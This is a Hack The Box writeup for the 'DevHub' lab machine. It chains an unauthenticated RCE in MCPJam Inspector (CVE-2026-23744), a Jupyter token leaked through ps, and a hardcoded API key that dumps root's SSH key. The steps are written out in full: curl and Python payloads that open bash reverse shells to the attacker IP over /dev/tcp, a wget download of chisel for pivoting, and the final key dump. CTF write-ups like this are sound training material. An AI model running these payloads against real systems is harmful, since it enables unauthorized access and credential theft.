# DevHub — Hack The Box Writeup

**Difficulty:** Medium  
**OS:** Linux (Ubuntu 22.04)  
**Author:** Season 11  
**Key Vulnerabilities:** CVE-2026-23744 (MCPJam RCE), Jupyter Code Execution, Hardcoded API Key  

---

## Summary

DevHub is a medium-difficulty Linux machine centered around modern AI/MCP tooling. The attack chain involves exploiting a critical zero-authentication RCE vulnerability in MCPJam Inspector v1.4.2 (CVE-2026-23744) to gain an initial foothold as `mcp-dev`, pivoting to the `analyst` user via an exposed Jupyter token and port-forwarding, then escalating to root by reading a hardcoded API key from a Python service and calling a hidden endpoint that dumps root's SSH private key.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oN DevHub.txt 10.129.4.161
```

**Results:**
- `22/tcp` — OpenSSH 8.9p1 (Ubuntu)
- `80/tcp` — nginx 1.18.0 (Ubuntu) — redirects to `http://devhub.htb/`

### Adding to /etc/hosts

```bash
sudo vim /etc/hosts
# Add: 10.129.4.161  devhub.htb
```

### WhatWeb Fingerprinting

```bash
whatweb http://devhub.htb
# Result: nginx/1.18.0, Title: DevHub - Internal Development Platform
```

---

## Web Enumeration

Browsing to `http://devhub.htb` reveals an internal development platform with three services listed:

| Service | Location | Status |
|---|---|---|
| MCP Inspector | Port 6274 | ✅ Active |
| Analytics Dashboard | localhost:8888 (Jupyter) | Internal Only |
| Code Repository | Git server | Maintenance Mode |

Tech stack disclosed: Node.js, Python 3, Jupyter, MCP Protocol, Ubuntu 24.04.

### MCPJam Inspector — Port 6274

Navigating to `http://devhub.htb:6274` reveals **MCPJam Inspector v1.4.2** — a Model Context Protocol development tool.

```bash
whatweb http://devhub.htb:6274
# MCPJam Inspector, access-control-allow-credentials: true
```

Version confirmed via the Settings page: **MCPJam Version: v1.4.2**

---

## Initial Foothold — CVE-2026-23744

MCPJam Inspector v1.4.2 and earlier are vulnerable to **CVE-2026-23744** — a zero-authentication Remote Code Execution vulnerability. The `/api/mcp/connect` endpoint allows arbitrary command execution without any authentication, and since MCPJam binds to `0.0.0.0` by default, it is reachable remotely.

### Exploitation

Set up a netcat listener:

```bash
nc -lnvp 4444
```

Send the exploit payload:

```bash
export PATH=/usr/bin:/bin:$PATH

curl -s http://devhub.htb:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.115/4444 0>&1"],"env":{}},"serverId":"pwn"}'
```

**Result:** Reverse shell as `mcp-dev`.

```
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
```

---

## Enumeration as mcp-dev

### System Users

```bash
cat /etc/passwd | grep -v nologin | grep -v false
```

Two interactive users found:
- `mcp-dev` (uid=1001)
- `analyst` (uid=1002)

### Internal Services

```bash
ss -tlnp
```

| Port | Service |
|---|---|
| 5000 | OPSMCP (Flask, localhost only) |
| 8888 | Jupyter Lab (localhost only) |
| 6274 | MCPJam Inspector (0.0.0.0) |

### Jupyter Token Leaked via ps aux

```bash
ps aux | grep jupyter
```

The Jupyter Lab process reveals its token in the command line arguments:

```
--ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

The OPSMCP server (`server.py`) runs as **root** on port 5000.

---

## Lateral Movement — mcp-dev → analyst

### Port Forwarding with Chisel

Since Jupyter is bound to localhost, we use chisel to forward port 8888.

**On Kali:**
```bash
./chisel server -p 8001 --reverse &
python3 -m http.server 8002
```

**On target:**
```bash
cd /tmp
wget http://10.10.14.115:8002/chisel -O chisel
chmod +x chisel
./chisel client 10.10.14.115:8001 R:8888:127.0.0.1:8888
```

### Accessing Jupyter

Navigate to `http://localhost:8888` and authenticate with the leaked token:

```
a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

### Code Execution via Notebook

1. Click `+` to open the Launcher
2. Click **Python 3 (ipykernel)** to create a new notebook
3. Set up listener on Kali: `nc -lnvp 5555`
4. Execute in a notebook cell:

```python
import os
os.system('bash -c "bash -i >& /dev/tcp/10.10.14.115/5555 0>&1"')
```

**Result:** Shell as `analyst`.

```
analyst@devhub:~/notebooks$
uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
```

### User Flag

```bash
cat /home/analyst/user.txt
# 8ffeae70c5643f16b35f505555e78257
```

---

## Privilege Escalation — analyst → root

### Reading OPSMCP server.py

As `analyst`, we can now read the OPSMCP server source:

```bash
cat /opt/opsmcp/server.py
```

Key findings:
- **Hardcoded API key:** `opsmcp_secret_key_4f5a6b7c8d9e0f1a`
- **Hidden endpoint:** `ops._admin_dump` — not listed in `/tools/list` but callable
- The `ops._admin_dump` tool with `target=ssh_keys` reads and returns `/root/.ssh/id_rsa`

### Calling the Hidden Endpoint

```bash
curl -s http://localhost:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

**Result:** Root's SSH private key is returned in the response.

### SSH as Root

Save the key on Kali and SSH in:

```bash
cat > /tmp/root_id_rsa << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
[KEY CONTENTS]
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 /tmp/root_id_rsa
ssh -i /tmp/root_id_rsa root@devhub.htb
```

### Root Flag

```bash
cat /root/root.txt
# c46ca1adae1bf2c3b6723a651d9e0881
```

---

## Attack Chain Summary

```
nmap → devhub.htb:80 → homepage leaks port 6274 (MCPJam v1.4.2)
       ↓
CVE-2026-23744 → /api/mcp/connect RCE → shell as mcp-dev
       ↓
ps aux leaks Jupyter token → chisel port forward → Jupyter UI
       ↓
Python notebook code execution → shell as analyst
       ↓
cat /opt/opsmcp/server.py → hardcoded API key + hidden endpoint
       ↓
ops._admin_dump?target=ssh_keys → root SSH private key → root
```

---

## Key Takeaways

- **MCPJam v1.4.2 (CVE-2026-23744):** Dev tools that bind to `0.0.0.0` with no auth are critical risks in any network environment.
- **Process enumeration:** `ps aux` can leak secrets like tokens, passwords, and keys passed as command-line arguments.
- **Jupyter as a pivot:** A running Jupyter instance with a known token is essentially unauthenticated code execution.
- **Hidden API endpoints:** Always thoroughly read application source code — hardcoded keys and undocumented routes are common in internal tools.
- **Chisel:** Essential tool for pivoting to localhost-bound services when SSH credentials aren't available.

---

*Rooted! 🎉*
